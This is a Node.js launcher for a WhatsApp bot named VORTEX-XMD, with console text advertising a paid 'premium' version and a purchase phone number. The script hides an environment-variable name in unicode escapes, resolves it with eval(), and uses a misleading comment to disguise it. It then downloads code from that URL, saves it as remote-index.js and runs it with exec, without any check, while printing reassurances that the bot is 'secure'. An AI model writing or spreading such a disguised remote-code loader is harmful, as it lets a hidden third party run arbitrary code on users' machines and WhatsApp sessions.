require('dotenv').config(); // Load environment variables from .env

const axios = require('axios');
const { exec } = require('child_process');
const fs = require('fs');

const envVar = "\u0070\u0072\u006f\u0063\u0065\u0073\u0073\u002e\u0065\u006e\u0076\u002e\u0049\u004d\u0041\u0047\u0045\u005f\u0042\u004f\u0054";  
const HansTz = eval(envVar); // Dynamically access process.env.image_bot for menu message list commands
const scriptPath = "./remote-index.js"; // Local temporary file  

async function downloadAndRunScript() {  
    try {  
        // All messages in red color
        console.log("\x1b[31m\nHansTz Send you request or Loading from Vortex-xmd Database script 🔥...\n\x1b[0m");  

        if (!HansTz) {  
            // Error message in red color
            console.error("\x1b[31mError: process from HansTz Site please try again or Report That Error Contact Dev Hanstz\x1b[0m");  
            return;  
        }  

        // Fetch script content  
        const response = await axios.get(HansTz);  
        const scriptCode = response.data;  

        // Save script to a local file  
        fs.writeFileSync(scriptPath, scriptCode, "utf-8");  

        // Updated success message in red color
        console.log("\x1b[31m\n🚀 VORTEX-XMD BOT SCRIPT - SUCCESSFULLY LOADED 🚀");
        console.log("💥 The VORTEX-XMD Bot script has been downloaded successfully from the HansTz Web Saver Database.");
        console.log("🔗 Your Bot is now fully connected and operational.");
        console.log("✨ Enjoy seamless automation with VORTEX-XMD, the ultimate bot script for your needs.");
        console.log("✅ Your bot is live and running smoothly. Get ready to enhance your automation experience!\n\x1b[0m");

        // Execute the script using Node.js  
        exec(`node ${scriptPath}`, (error, stdout, stderr) => {  
            if (error) {  
                // Error message in red color
                console.error("\x1b[31mExecution error: " + error.message + "\x1b[0m");  
                return;  
            }  
            if (stderr) {  
                // Error message in red color
                console.error("\x1b[31mScript stderr: " + stderr + "\x1b[0m");  
            }  
            console.log("\x1b[31mScript Output:\n" + stdout + "\x1b[0m");  // All output in red color
        });  

        // All payment messages in red color
        console.log("\x1b[31m\n🔹 VORTEX-XMD | Premium Bot Script 🔹");
        console.log("✅ Developed by: HANS-TZ");
        console.log("🚀 Powered by: HANS-TZ Service");
        console.log("📌 Exclusive & Secure | Limited Access\n");
        console.log("🔒 Get Your Own VORTEX-XMD Bot Script Today! 🔒\n");
        console.log("💰 Pricing & Payment Details:");
        console.log("- Secure & Fast Deployment");
        console.log("- Full Access to Premium Features");
        console.log("- 24/7 Support Available\n");
        console.log("📞 Contact for Purchase:");
        console.log("📲 +255756530143 (WhatsApp & Direct)\n");
        console.log("🔹 Serious Buyers Only!");
        console.log("⚠️ This script is protected and works only with HANS-TZ services. Unauthorized resale or sharing is strictly prohibited.\n");
        console.log("🚀 Get your premium bot now and level up your automation! 🚀\x1b[0m\n");

        // Add your "nmp2 say VORTEX-XMD" message in red
        console.log("\x1b[31m\nVORTEX-XMD-CONNECTED-TO-YOUR-WHATSAPP ENJOY\x1b[0m\n");  

    } catch (error) {  
        // All error messages in red color
        console.error("\x1b[31mError downloading or executing script: " + error + "\x1b[0m");  
    }  
}  

// Run the script loader  
downloadAndRunScript();
